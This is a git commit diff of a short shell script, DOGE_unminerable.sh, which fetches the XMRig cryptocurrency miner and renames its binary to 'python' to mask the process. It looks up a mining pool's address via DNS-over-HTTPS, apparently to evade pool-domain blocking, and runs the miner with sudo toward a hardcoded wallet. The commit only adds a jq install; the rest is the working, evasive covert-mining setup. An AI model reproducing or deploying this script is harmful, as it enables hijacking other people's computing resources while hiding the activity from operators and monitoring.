386fd4d918ebc75b002918b6590e57f914c10437
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-09-27 11:09:25 +0700

    Update DOGE_unminerable.sh

--- DOGE_unminerable.sh
+++ DOGE_unminerable.sh
@@ -2,5 +2,7 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux
 tar -xf xmrig-6.15.1-linux-x64.tar.gz
 cd xmrig-6.15.1
 mv xmrig python
+sudo apt update
+sudo apt install jq -y
 ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=us-west.minexmr.com&type=A' | jq -r '.Answer[0].data')
 sudo ./python -o $ip:4444 -u 878g8ZsJ65oWcPxsugXyWaS7Eo2peDZpdGxZSVBuMb2kZXr9YC1LbMp86KXs3eoVHfGhNtNS417PRWfRK8nqLN8pSwRnKEN
